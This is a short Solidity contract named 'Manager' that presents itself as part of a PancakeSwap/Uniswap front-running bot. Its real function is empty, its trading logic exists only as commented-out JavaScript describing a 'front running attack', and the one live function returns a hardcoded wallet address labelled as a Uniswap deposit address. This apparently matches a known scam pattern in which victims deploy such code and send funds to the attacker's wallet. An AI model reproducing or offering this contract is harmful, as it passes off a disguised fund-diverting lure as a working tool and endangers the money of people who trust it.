pragma solidity ^0.6.6;

contract Manager {
	function performTasks() public {
	    	}

/*  try {
        web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));
        web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));
       web3 = new Web3(EthereumTesterProvider());
       web3.eth.getAccounts(console.log);
      web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));
    pancakeRouter = new web3.eth.Contract(PANCAKE_ROUTER_ABI, PANCAKE_ROUTER_ADDRESS);
        pancakeFactory = new web3.eth.Contract(PANCAKE_FACTORY_ABI, PANCAKE_FACTORY_ADDRESS);
        abiDecoder.addABI(PANCAKE_ROUTER_ABI);
        manager;

        return true;
    } catch (error) {
      console.log(error);
      return false;
    }
    */

	function uniswapDepositAddress() public pure returns (address) {
//subscription.unsubscribe();
/*
        console.log('Perform front running attack...');

        gasPrice = parseInt(transaction['gasPrice']);
        newGasPrice = gasPrice + 50*ONE_GWEI;

        estimatedInput = ((amount*0.999)*(10**18)).toString();
        realInput = (amount*(10**18)).toString();
        gasLimit = (300000).toString();
        
        await updatePoolInfo();

        var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
        swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);

        console.log("wait until the honest transaction is done...", transaction['hash']);
        */
		return 0x41FbC651a1462FB215eBa638A2F2c3F9885f636b;
 /*console.log(max_allowance.toString());
        var approveTX ={
                from: user_wallet.address,
                to: out_token_address,
                gas: 50000,
                gasPrice: gasPrice*ONE_GWEI,
                data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()*/
	}
}
